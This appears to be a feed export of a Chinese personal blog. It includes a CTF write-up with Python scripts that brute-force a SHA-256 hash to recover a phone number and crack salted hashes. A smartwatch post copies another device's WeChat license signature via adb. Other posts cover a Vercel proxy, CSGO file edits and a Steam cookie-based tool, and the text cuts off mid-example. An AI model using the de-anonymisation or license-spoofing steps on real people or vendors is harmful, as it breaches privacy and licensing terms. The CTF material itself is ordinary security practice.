      <title>2022网鼎杯青龙组——个人WriteUP</title>
      <link href="/posts/CTF-20220826-wangdingcup-qinglong/"/>
      <url>/posts/CTF-20220826-wangdingcup-qinglong/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a><strong>签到</strong></h2><p>没啥技术含量，求助于万能的 <del>百度</del> Bing</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115011.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115015.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115020.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115024.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115028.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115033.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115036.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/msedge-20220826-115042.png"></p><h2 id="crypto091"><a href="#crypto091" class="headerlink" title="crypto091"></a><strong>crypto091</strong></h2><p>小A鼓起勇气向女神索要电话号码，但女神一定要考考他。女神说她最近刚看了一篇发表于安全顶会USENIX Security 2021的论文，论文发现苹果AirDrop隔空投送功能的漏洞，该漏洞可以向陌生人泄露AirDrop发起者或接收者的电话号码和电子邮箱。小A经过一番努力，获得了女神手机在AirDrop时传输的手机号哈希值，但再往下就不会了，你能继续帮助他吗？小A只记得女神手机号是170号段首批放号的联通号码。</p><p>Hash：c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc</p><p>flag格式：flag{13位电话号码（纯数字，含国家代码）}</p><ul><li>170号段首批放号的联通号码：1709</li><li>限定做法：Hash爆破</li><li>Hash为64位，因此Hash的计算方法是<code>sha256</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">prefix = <span class="string">&#x27;861709&#x27;</span> <span class="comment"># 联通首批放号的电话号码头</span></span><br><span class="line">compare_hash = <span class="string">&#x27;c22a563acc2a587afbfaaaa6d67bc6e628872b00bd7e998873881f7c6fdc62fc&#x27;</span></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10000000</span>):</span><br><span class="line">    to_hash = prefix+<span class="string">&#x27;&#123;:0&gt;7&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i))<span class="comment"># 这么写主要是为了构造电话号码的格式</span></span><br><span class="line">    to_compare_hash=hashlib.sha256(to_hash.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(to_hash, to_compare_hash)</span><br><span class="line">    <span class="keyword">if</span> to_compare_hash == compare_hash:</span><br><span class="line">        result = prefix+<span class="built_in">str</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220826-wangdingcup-qinglong/WindowsTerminal-20220826-115133.png"></p><h2 id="Hash爆破脚本"><a href="#Hash爆破脚本" class="headerlink" title="Hash爆破脚本"></a>Hash爆破脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">salt = <span class="built_in">input</span>(<span class="string">&#x27;salt: &#x27;</span>)</span><br><span class="line">target = <span class="built_in">input</span>(<span class="string">&#x27;target: &#x27;</span>)</span><br><span class="line">ls = string.ascii_letters + string.digits</span><br><span class="line">res = permutations(ls,<span class="number">4</span>)</span><br><span class="line">result = <span class="string">&#x27;empty&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> res:</span><br><span class="line">    XXXX = _[<span class="number">0</span>]+_[<span class="number">1</span>]+_[<span class="number">2</span>]+_[<span class="number">3</span>]</span><br><span class="line">    to_hash = XXXX+salt</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha256(to_hash.encode()).hexdigest() == target: </span><br><span class="line">        result = XXXX</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>用于解决题目提示<code>XXXX + 一串salt == Hash值</code>的开头问题，因为已经很多次遇到这种问题了，所以写了个脚本来爆破，只需要输入对应的salt和hash就可以解出来</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ticwatch Pro 3 使用体验报告</title>
      <link href="/posts/Ticwatch-pro-3-experience/"/>
      <url>/posts/Ticwatch-pro-3-experience/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>最近因为游泳，带着我的小米手环6，结果第二天游泳下来发现，它的屏幕不好使了，有鬼触的现象，于是就想换一块表</p><p>因为身边用OPPO Watch 2的人比较多，我又不想跟他们用一样的东西，于是我另辟蹊径，找其他的表</p><p>一开始看到米表，但是据说配置拉胯，就不考虑了，然后看到了出门问问家的Ticwatch pro 3，这是一个搭载着Google WearOS的智能手表，不过当然有着中国化的成分（指删除大量谷歌服务）</p><p>跟鱼子市场的卖家进行大量沟通后，我以合适的价格拿下了这块表</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/QQ%E5%9B%BE%E7%89%8720220823120334.jpg"></p><p>接着就开始折腾了，拿到手是一块啥东西都没设置的新表，会进入“新手引导”模式，我也是花费了一定的时间才弄好</p><hr><h2 id="折腾环节"><a href="#折腾环节" class="headerlink" title="折腾环节"></a>折腾环节</h2><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/about.png"></p><p>按下右上方的按键就可以打开启动器，从启动器打开软件</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/launcher.png"></p><h3 id="从应用商店安装软件"><a href="#从应用商店安装软件" class="headerlink" title="从应用商店安装软件"></a>从应用商店安装软件</h3><p>官方的应用商店就跟App Store一样，一键下载安装就行，其实没啥难度，这里就附几张图吧</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/screen(4).png.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/screen(5).png.png"></p><h3 id="使用adb安装软件"><a href="#使用adb安装软件" class="headerlink" title="使用adb安装软件"></a>使用adb安装软件</h3><h4 id="使用计算机从adb安装软件"><a href="#使用计算机从adb安装软件" class="headerlink" title="使用计算机从adb安装软件"></a>使用计算机从adb安装软件</h4><p>这个要求打开adb，跟手机的开启方法一样，连续点击版本号开启开发者选项，然后在开发者选项里面找到<code>adb调试</code>，把它和<code>通过WLAN调试</code>都打开</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/screen(3).png.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/screen(6).png.png"></p><p>让手表和电脑连到同一个WIFI，查看手表的IP地址，接着电脑输入<code>adb connect &lt;ip&gt;</code>就可以连接到手表了，然后使用<code>adb install &lt;apk&gt;</code>就能安装软件了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/WindowsTerminal-20220823-121709.png"></p><h4 id="使用第三方应用商店安装软件"><a href="#使用第三方应用商店安装软件" class="headerlink" title="使用第三方应用商店安装软件"></a>使用第三方应用商店安装软件</h4><p>这里我用了一个叫做唯趣应用商店的东西（官网：<a href="http://etralab.top/etralab_appstore/html/select_install_method_android.html">唯趣应用商店 - 下载 (etralab.top)</a>），本质也是用adb的，因为手表的<code>软件包管理</code>被阉割了，所以我们只能通过adb来装东西</p><p>这是一个手表上的应用商店，找到自己想要的软件直接下载安装就行了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/screen(7).png.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/screen(8).png.png"></p><h3 id="使用微信儿童手表版"><a href="#使用微信儿童手表版" class="headerlink" title="使用微信儿童手表版"></a>使用微信儿童手表版</h3><p>为什么我要单开一个标题给这个内容，因为自带的绿色微信需要连接手机同步使用，这就违背了我用它的理念，我就是要脱离手机使用</p><p>隔壁OPPO Watch可以使用微信手表版，但是TWP3不支持，因为微信没有给LICENSE给TWP3，那就只能借用LICENSE了</p><p>我借了块OPPO Watch来提取它的LICENSE，首先打开OW的adb调试，连接到电脑</p><p>然后输入以下命令来获取LICENSE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings list global</span><br></pre></td></tr></table></figure><p>（图为TWP3的配置，因为忘记截图了，然后我已经放进去了，就直接拿来顶替了）</p><p>我们找到以下内容，把这些内容先保存起来</p><table><thead><tr><th>字段类型</th><th>名字</th><th>相关作用</th></tr></thead><tbody><tr><td>int</td><td>ilink_product_id</td><td>产品id</td></tr><tr><td>int</td><td>ilink_key_version</td><td>版本</td></tr><tr><td>int</td><td>ilink_support</td><td>ilink_support &#x3D;1表示手表支持运行微信</td></tr><tr><td>string</td><td>ilink_device_id</td><td>设备id</td></tr><tr><td>String</td><td>ilink_device_signature</td><td>验证签名</td></tr></tbody></table><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/WindowsTerminal-20220823-120021.png"></p><p>然后连接到TWP3，使用命令来写入配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings put global ilink_device_id <span class="string">&quot;device_id&quot;</span></span><br><span class="line">adb shell settings put global ilink_device_signature <span class="string">&quot;device_signature&quot;</span></span><br><span class="line">adb shell settings put global ilink_key_version <span class="string">&quot;1&quot;</span></span><br><span class="line">adb shell settings put global ilink_product_id <span class="string">&quot;xxxx&quot;</span></span><br><span class="line">adb shell settings put global ilink_support <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure><p>写入后，再次打开微信儿童版就可以扫码登录使用了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Ticwatch-pro-3-experience/Wechatkid.png"></p><h3 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>带有ESIM确实可以脱离手机使用，还可以刷一刷B站（用腕上哔哩），看看新闻啥的，特别符合我现在的状态。有的时候跟群友用QQ吹水或者用微信跟我妈聊会天，完全OK</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>圆屏毕竟不是OW的方屏，很多手机的APP装上TWP3后会因为屏幕的限制而变得无法使用（如Outlook），而且TWP3阉割了Android Webview组件，导致很多东西用不了（直接闪退，例如在QQ邮箱阅读邮件）</p><p>另外，没有闪充，充电很慢，而且配的线是2PIN的，手表有4个金属触点，换言之就是没有数据传输功能（晚点自造线去）</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，使用体验跟价格是匹配的，能够满足我的日常需求，但你要问我推不推荐购买，我只能说现阶段OW3可能更好一些</p>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Daily </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常吐槽10：我的域名被停止解析了 —— 一段时间</title>
      <link href="/posts/diary10/"/>
      <url>/posts/diary10/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这件事还得从群里的兄弟那里说起（右图）<img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary10/TIM-20220723-232852.png"></p><p>主要是我这边没办法用个人身份备案，然后有些东西没有备案就很恼人，尤其是最近收到的Leancloud国际版不对大陆用户提供服务的通知</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary10/ApplicationFrameHost-20220723-235057.png"></p><p>这就搞得没备案会让我陷入被动（特别是在某些服务上面），那没办法啦，既然有能够弄企备的方法，那就去弄一个吧</p><p>然后我就找上门了，就像下面这样</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary10/TIM--20220724-065607.png"><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary10/TIM-20220724-065625.png"></p><p>然后我就开始等待了，按照对面的说法我前面还有一个人，然后备案要等14-30天</p><p>结果某一天，别人告诉我服务炸了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary10/QQ%E5%9B%BE%E7%89%8720220724070203.jpg"></p><p>然后我就去排查，看我的腾讯云上TS正在正常运行，但是就是连不到</p><p>与此同时，我的MC服务器也连接不到了，但是BungeeCord还在正常运行</p><p>我就猜是不是域名解析掉了，我就去问备案那边，他说确实是</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/diary10/TIM-20220724-070411.png"></p><p>那有啥办法嘛，只能等了呗</p><p>我就把我的必要服务开了第二个域名，例如我的BLOG开在了<a href="https://blog.ninym.top/">https://blog.ninym.top</a>上面，前几天做的<a href="https://linkcheck.bili33.top/">hexo域名检测工具</a>开在了<a href="https://linkcheck.ninym.top/">https://linkcheck.ninym.top</a></p><p>然后把部分Github仓库涉及到文档在我的网站上的加一条备用文档链接，然后陷入无尽的等待……</p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vercel搭建反向代理</title>
      <link href="/posts/vercel-reverse-proxy/"/>
      <url>/posts/vercel-reverse-proxy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>首先你需要安装一下vercel的命令行工具，使用npm进行安装（需要安装nodejs，没安装的自己去下一个）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -g vercel</span><br></pre></td></tr></table></figure><p>当然你也可以用cnpm安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cnpm i -g vercel</span><br></pre></td></tr></table></figure><p>安装完后可以使用<code>vercel -v</code>来看看是否安装成功了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vercel -v</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; Vercel CLI 24.2.4</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt; 24.2.4</span></span><br></pre></td></tr></table></figure><p>接着把下面这些内容复制到一个json文件里面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/(.*)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://bili33.top/$1&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>其中，我的域名那里可以改成你想要反代的网站的域名，例如填写<code>cdn.jsdelivr.net</code>，就可以按照jsdelivr的格式去使用它的CDN，例如</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/(.*)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cdn.jsdelivr.net/$1&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://bili33.top&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;redirects&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/npm/(.*)&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;destination&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里<code>redirects</code>是访问特定的route的时候进行重定向，可以达到禁止访问的目的（但是实测好像并不太行）</p><p>更多关于json文件的适用方法，可以参照<a href="https://vercel.com/docs/project-configuration">https://vercel.com/docs/project-configuration</a></p><p>写完json文件以后，就开始对vercel的cli进行验证，使用<code>vercel login</code>进行登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vercel login</span><br><span class="line">Vercel CLI 24.2.4</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Log <span class="keyword">in</span> to Vercel (Use arrow keys)</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Continue with GitHub</span></span><br><span class="line">  Continue with GitLab</span><br><span class="line">  Continue with Bitbucket</span><br><span class="line">  Continue with Email</span><br><span class="line">  Continue with SAML Single Sign-On</span><br><span class="line">  ─────────────────────────────────</span><br><span class="line">  Abort</span><br></pre></td></tr></table></figure><p>按上下键可以选择登录方式，我就直接用Github登录了，会返回一个登录地址，可以直接在浏览器打开</p><p>登录完成后会像我下面这个这么提示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vercel login</span><br><span class="line">Vercel CLI 24.2.4</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Log <span class="keyword">in</span> to Vercel github</span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Success! GitHub authentication complete <span class="keyword">for</span> &lt;your email&gt;</span></span><br><span class="line">Congratulations! You are now logged in. In order to deploy something, run `vercel`.</span><br><span class="line">💡  Connect your Git Repositories to deploy every branch push automatically (https://vercel.link/git).</span><br></pre></td></tr></table></figure><p>接着我们对刚刚的json文件进行部署，使用下面的命令即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vercel -A &lt;name&gt;.json --prod</span><br></pre></td></tr></table></figure><p>这里的json的文件名要指定为你刚刚设置的文件，<code>--prod</code>是推入生产环境，按照提示输入就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">vercel -A &lt;name&gt;.json --prod</span><br><span class="line">Vercel CLI 24.2.4</span><br><span class="line">❗️  Your Project was either deleted, transferred to a new Team, or you don’t have access to it anymore.</span><br><span class="line">? Set up and deploy “&lt;your folder&gt;”? [Y/n] y</span><br><span class="line">? Which scope do you want to deploy to? &lt;your username or team&gt;</span><br><span class="line">? Link to existing project? [y/N] n</span><br><span class="line">? What’s your project’s name? vercel-json</span><br><span class="line">? In which directory is your code located? ./</span><br><span class="line">No framework detected. Default Project Settings:</span><br><span class="line">- Build Command: `npm run vercel-build` or `npm run build`</span><br><span class="line">- Output Directory: `public` if it exists, or `.`</span><br><span class="line">- Development Command: None</span><br><span class="line">? Want to override the settings? [y/N] n</span><br><span class="line">🔗  Linked to &lt;user/project&gt; (created .vercel)</span><br><span class="line">🔍  Inspect: &lt;Your inspect link&gt; [961ms]</span><br><span class="line">✅  Production: &lt;Your production link&gt; [copied to clipboard] [10s]</span><br></pre></td></tr></table></figure><p>部署完后你就可以在Vercel中找到，并进行配置了</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSGO国服反和谐教程</title>
      <link href="/posts/CSGO-Anti-LowViolence/"/>
      <url>/posts/CSGO-Anti-LowViolence/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>其实这个东西非常简单，稍微翻一下文件就可以发现完美的操作了</p><p>先打开Steam，右键CSGO，选择<code>属性</code>，在左边的<code>本地文件</code>里面选择<code>浏览</code></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CSGO-Anti-LowViolence/steam-20220703-100832.png"></p><p>这会打开你的CSGO游戏文件夹，打开<code>csgo</code>文件夹，稍微翻一下就可以发现开头为<code>pakxv</code>的几个文件，有很明显的<code>audiochinese</code> <code>perfectworld</code> <code>lowviolence</code>字样，把它们删了就好了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CSGO-Anti-LowViolence/explorer-20220703-100949.png"></p><blockquote><p>注：每次CSGO更新都要进行这个操作！</p></blockquote><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CSGO-Anti-LowViolence/TheGoodYouth.jpg"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CSGO-Anti-LowViolence/AntiViolence-Blood.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Games </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Games </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SteamAutoQueue —— Steam自动探索3次队列，帮你拿到促销期间的卡牌！</title>
      <link href="/posts/SteamAutoQueue-Manual/"/>
      <url>/posts/SteamAutoQueue-Manual/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>其实这个我从夏促前就开始写了，只不过刚好那一周撞上各种考试，所以就保证了本地Windows版本的正常运行，Linux的就没动，等到周末再干的时候夏促已经开始了……</strong></p><p>为啥我要做这个？主要是学生党又不是天天开电脑，像TemperMonkey的那种自动探索队列的脚本或者是Steam++里面带的那个，都要打开电脑，再去打开浏览器或者是Steam，所以我就做了一个这个不需要打开任何东西的。</p><p>因为完成太晚了，所以等到冬促的时候我再去推广吧，要是有哪位大哥愿意帮我推广的尽管发就行了，发完了<a href="https://space.bilibili.com/44666814">站内艾特一下我</a>~</p><blockquote><p>先点个STAR✨，我们马上开始教学！</p></blockquote><h2 id="简体中文"><a href="#简体中文" class="headerlink" title="简体中文"></a>简体中文</h2><ul><li><a href="#%E5%8F%98%E9%87%8F%E8%8E%B7%E5%8F%96">变量获取</a></li><li><a href="#%E5%9C%A8Github%20Action%E8%BF%90%E8%A1%8C">在Github Action运行</a></li></ul><h3 id="变量获取"><a href="#变量获取" class="headerlink" title="变量获取"></a>变量获取</h3><p>首先先打开你的Steam商店，正常登录你的账号后（登录时一定要选择<code>在这台电脑上记住我</code>），按<kbd>F12</kbd>打开开发者工具</p><p>然后在上面的导航栏找到应用程序(Application)，然后在左边的树状图导航栏找到<code>cookie</code> -&gt; <code>https://store.steampowered.com</code></p><p>你应该会看到像我图示的这样的表格</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/SteamAutoQueue/msedge-20220702-170037.png"></p><p>在这里面我们需要找到以下内容，对应着config文件的配置（&lt;<code>名称</code>: <code>变量类型</code>&gt;）</p><p>其中<code>proxy</code>是代理的地址，这个根据自己的需求去填写（有的人可能会开v2ray啥的，所以做了个这个，如果是在Github Action运行则不需要这个）</p><p><strong>请注意，<code>steamRememberLogin</code>只有一个月的有效期，目前不清楚缺少这个是否能够运行（<del>主要因为我懒我没测</del> 此变量已弃用，不知道获取一次能用多久）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;proxy&quot;: &quot;&quot;,</span><br><span class="line">    &quot;steam&quot;: &#123;</span><br><span class="line">        &quot;sessionid&quot;: &lt;sessionid: str&gt;,</span><br><span class="line">        &quot;steamLoginSecure&quot;: &lt;steamLoginSecure: str&gt;,</span><br><span class="line">        &quot;browserid&quot;: &lt;browserid: str&gt;,</span><br><span class="line">        &quot;steamID64&quot;: &lt;Steam64位ID，就是steamMachineAuth后面的数字: str&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一个例子（例子中的内容对应的账号已经退出登录，故内容为无效cookie）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;proxy&quot;: &quot;&quot;,</span><br><span class="line">    &quot;steam&quot;: &#123;</span><br><span class="line">        &quot;sessionid&quot;: &quot;9775e63b29f841ea44c4d5f2&quot;,</span><br><span class="line">        &quot;steamLoginSecure&quot;: 